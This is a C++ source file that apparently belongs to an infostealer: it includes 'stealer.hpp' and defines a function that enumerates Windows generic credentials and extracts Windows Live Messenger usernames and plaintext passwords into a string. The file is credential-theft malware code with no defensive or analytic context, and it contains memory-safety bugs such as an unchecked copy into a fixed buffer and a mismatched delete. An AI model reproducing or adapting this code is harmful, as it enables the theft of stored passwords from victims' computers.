#include "../stealer.hpp"

string GetWLMPasswords( API *api ) {
	string ret = "";
	string wlm = "WL: "; 
	try {
		DATA_BLOB DataIn;
		char strCredentials[1024];

		DWORD Count;
		PCREDENTIAL *Credential;

		if (api->CredEnumerate(NULL, 0, &Count, &Credential)) {
		  for ( int i = 0; i < Count; i++) {
			if ( Credential[i]->Type == CRED_TYPE_GENERIC) {
				DataIn.pbData = Credential[i]->CredentialBlob;
				DataIn.cbData = Credential[i]->CredentialBlobSize;
				if (DataIn.cbData == 0)
					continue;
				ret = Credential[i]->TargetName;
				ret = ret.substr(ret.find_first_of("=")+1, ret.length() - ret.find_first_of("="));
				ret += ":";
				memcpy(strCredentials, DataIn.pbData, DataIn.cbData);
				char *passw = new char[DataIn.cbData];
				int j = 0;
				for (int i = 0; i < DataIn.cbData; i++) {
					if (strCredentials[i] != '\0') {
						passw[j] = strCredentials[i];
						j++;
					}
				}
				passw[j] = '\0';
				ret += passw;
				ret += "\n";
				try { delete passw; } catch (...) {}
			}
		  }
		  api->CredFree(Credential);
		}
	} catch (...) {
	}
	if (ret.length() == 0)
		return ret;
	wlm += ret;
	return wlm;
}